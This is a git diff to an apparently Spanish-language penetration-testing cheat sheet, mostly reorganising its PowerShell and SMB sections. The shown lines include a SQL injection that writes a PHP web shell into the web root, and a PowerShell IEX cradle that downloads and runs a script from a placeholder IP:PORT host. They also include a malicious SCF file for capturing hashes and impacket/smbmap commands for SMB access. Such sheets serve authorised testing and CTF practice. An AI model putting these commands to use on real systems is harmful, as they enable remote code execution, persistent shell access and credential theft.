@@ -138,12 +138,6 @@ UNION SELECT SLEEP(5),2,...; - --
 select "<?php system($_GET[cmd]);?>" into outfile '/var/www/html/cronoshell.php'
 ```
 
-# Powershell
-
-Descargar binarios
-```
-powershell IEX(New-Object Net.WebClient).downloadString('http://IP:PORT/binario.binario')
-```
 # Bash
 
 ## Listeners
@@ -200,6 +194,15 @@ export SHELL=bash
 ```
 # Windows
 
+## Powershell
+
+Descargar binarios
+```
+powershell IEX(New-Object Net.WebClient).downloadString('http://IP:PORT/binario.binario')
+```
+
+## Hashes
+
 Malicious SCF File
 ```
 [Shell]
@@ -211,9 +214,7 @@ Command=ToggleDesktop
 ```
 impacket-smbserver smbFolder $(pwd) -smb2support
 ```
-#SMB
-
-
+##SMB
 ```
 smbmap -H IP -u usuario -p password
 ```
